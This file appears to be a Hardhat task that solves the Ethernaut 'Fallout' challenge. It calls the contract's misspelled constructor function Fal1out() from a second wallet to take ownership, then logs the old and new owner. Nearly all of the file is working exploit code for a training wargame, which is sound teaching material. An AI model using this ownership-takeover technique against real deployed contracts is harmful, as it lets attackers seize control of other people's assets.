import { task } from 'hardhat/config';
import { Fallout } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_MAKEOWNER } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import abi from '../../data/abi/Fallout.json';

task(TASK_MAKEOWNER, 'Become Owner of Contract')
  .setAction(async (_taskArgs, hre) => {
    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const userWallet = wallets[1];
    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    let contractAddress = '';
    if (network.name === 'rinkeby') {
      contractAddress = process.env.RINKEBY_CONTRACT_ADDRESS || '';
    } else if (network.name === 'unknown') { //localhost network
      contractAddress = process.env.LOCALHOST_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${contractAddress}`);

    const contract: Fallout = new hre.ethers.Contract(contractAddress, abi, userWallet) as Fallout;

    const origOwner: string = await contract.owner();
    console.log(`Original owner: ${origOwner}`);

    // User calls Fal1out
    await contract.connect(userWallet).Fal1out();

    const newOwner: string = await contract.owner();
    console.log(`New owner: ${newOwner}`);

    if (newOwner === userWallet.address) {
      console.log("Claim ownership success");
    } else {
      console.log('Claim ownership failed');
    }

    process.exit(0)
  });